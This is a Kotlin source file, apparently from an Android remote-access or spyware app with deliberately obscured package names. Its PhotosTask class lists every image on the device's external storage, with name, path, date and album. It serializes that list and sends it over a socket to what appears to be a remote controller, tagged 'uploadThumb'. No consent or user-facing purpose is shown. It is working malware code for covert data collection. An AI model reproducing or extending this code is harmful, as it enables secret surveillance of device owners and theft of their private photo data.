package com.xxx.zzz.commandp.taskssv

import android.content.Context
import android.provider.MediaStore
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.commandp.utilsss.Image
import com.xxx.zzz.socketsp.IOSocketyt


class PhotosTask(private val ctx: Context) : BaseTask(ctx) {

    private var length = 0

    private fun getImagesList(): ArrayList<Image> {
        val photoList = ArrayList<Image>()
        runCatching {
            val cur =
                ctx.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    MediaStore.Images.ImageColumns.DATE_MODIFIED
                )!!

            while (cur.moveToNext()) {
                val path = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DATA))
                val bucket =
                    cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME))
                val date =
                    cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DATE_MODIFIED))
                val name =
                    cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DISPLAY_NAME))

                photoList.add(Image(name, path, date, bucket))
            }

            cur.close()
            IOSocketyt.sendLogs("", "PhotosTask ${photoList.size}", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "PhotosTask ${it.localizedMessage}", "error")
        }
        return photoList
    }

    override fun run() {
        super.run()
        runCatching {
            val list = getImagesList()
            length = list.size
            IOSocketyt.sendLogs("", Gsonq().toJson(list), "uploadThumb")
        }.onFailure {
            IOSocketyt.sendLogs("", "PhotosTask ${it.localizedMessage}", "error")
        }
    }

}